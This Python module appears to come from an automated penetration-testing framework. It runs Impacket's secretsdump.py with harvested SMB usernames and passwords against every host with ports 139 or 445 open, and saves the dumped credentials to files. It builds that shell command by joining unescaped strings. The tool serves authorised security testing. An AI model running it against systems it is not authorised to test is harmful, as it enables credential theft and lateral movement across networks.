from core.actionModule import actionModule
from core.keystore import KeyStore as kb
from core.utils import Utils


class impacketsecretsdump(actionModule):
    def __init__(self, config, display, lock):
        super(impacketsecretsdump, self).__init__(config, display, lock)
        self.title = "Test for NULL Session"
        self.shortName = "secretsDump"
        self.description = "execute [sectredsdump.py [user]:[password]@[target] on each target"

        self.requirements = ["secretsdump.py"]
        self.triggers = ["newSmbPassword"]

        self.safeLevel = 5

    def getTargets(self):
        # we are interested in all hosts
        self.targets = kb.get(['host/*/tcpport/139', 'host/*/tcpport/445'])

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        # loop over each target
        for t in self.targets:
            users = kb.get(['host/' + t + '/user'])
            self.display.verbose(self.shortName + " - Connecting to " + t)
            for user in users:
                # verify we have not tested this host before
                if not self.seentarget(t + str(user)):
                    # add the new IP to the already seen list
                    self.addseentarget(t + str(user))

                    passwords = kb.get(['host/' + t + '/user/' + user + '/password'])
                    for password in passwords:
                        self.display.verbose(self.shortName + " - Connecting to " + t)

                        # make outfile
                        temp_file = self.config[
                                        "proofsDir"] + self.shortName + "_" + t + "_" + user + "_" + Utils.getRandStr(
                            10)

                        # run secretesdump.py
                        command = "secretsdump.py -outputfile " + temp_file + " \"" + user + "\":\"" + password + \
                                  "\"@" + t
                        result = Utils.execWait(command, None)

                        # TODO
                        # parse out put and store any new info and fire any additional triggers
        return
